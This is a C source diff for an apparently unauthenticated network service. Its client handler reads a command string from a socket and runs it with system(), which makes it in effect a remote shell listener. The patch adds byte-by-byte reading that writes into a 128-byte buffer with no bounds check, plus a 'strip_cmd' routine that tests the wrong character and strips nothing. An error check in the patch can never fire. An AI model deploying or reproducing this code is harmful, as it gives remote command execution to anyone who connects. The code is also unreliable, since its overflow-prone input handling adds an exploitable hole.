@@ -134,6 +134,23 @@ int main(argc,argv)
 	return 0;
 }
 
+void strip_cmd(command)
+	char *command;
+{
+	char tmp[strlen(command)+1];
+	int i;
+
+	for(i=0; i<strlen(command)+1; ++i) {
+		if(*command == 0x0A || *command == 0x0D) {
+			continue;
+		}
+		tmp[i] = *(command+i);
+	}
+	for(i=0; i<strlen(command)+1; ++i) {
+		*(command+i) = tmp[i];
+	}
+}
+
 void handle_clients(socket,address)
 	int *socket;
 	const char *address;
@@ -141,23 +158,28 @@ void handle_clients(socket,address)
 	char msg[256];
 	char cmd[128];
 	int bytes;
+	int c;
 
 	memset(msg,0,sizeof(msg));
 	memset(cmd,0,sizeof(cmd));
 	while(1) {
 		send(*socket,"CMD >> ",7,0);
 		bytes = 0;
-		while((bytes = recv(*socket,cmd,sizeof(cmd),0)) > 0) {
-			if(bytes < 0) {
-				sprintf(msg,"Error: receiving from %s.\r\n",
-					address);
-				send(*socket,msg,strlen(msg),0);
+		c = 0;
+		while(recv(*socket,&c,1,0) > 0) {
+			if(c == 0x0A || c == 0x0D) {
 				break;
+			} else {
+				cmd[bytes] = c;
 			}
-			if(cmd[bytes] == 10 || cmd[bytes] == 13) {
-				break;
-			}
+			bytes++;
 		}
+		if(bytes < 0) {
+			sprintf(msg,"Error: receiving from %s.\r\n",
+				address);
+			send(*socket,msg,strlen(msg),0);
+		}
+		strip_cmd(cmd);
 
 		if(strcmp(cmd,"exit") == 0) {
 			break;
@@ -168,17 +190,21 @@ void handle_clients(socket,address)
 			memset(cmd,0,sizeof(cmd));
 			send(*socket,"Enter command: ",15,0);
 			bytes = 0;
-			while((bytes = recv(*socket,cmd,sizeof(cmd),0)) > 0) {
-				if(bytes < 0) {
-					sprintf(msg,"Error: receiving from %s.\r\n",
-						address);
-					send(*socket,msg,strlen(msg),0);
+			c = 0;
+			while(recv(*socket,&c,1,0) > 0) {
+				if(c == 0x0A || c == 0x0D) {
 					break;
+				} else {
+					cmd[bytes] = c;
 				}
-				if(cmd[bytes] == 10 || cmd[bytes] == 13) {
-					break;
-				}
+				bytes++;
 			}
+			if(bytes < 0) {
+				sprintf(msg,"Error: receiving from %s.\r\n",
+					address);
+				send(*socket,msg,strlen(msg),0);
+			}
+			strip_cmd(cmd);
 			system(cmd);
 		} else {
 			sprintf(msg,"Unknown command.\r\n");
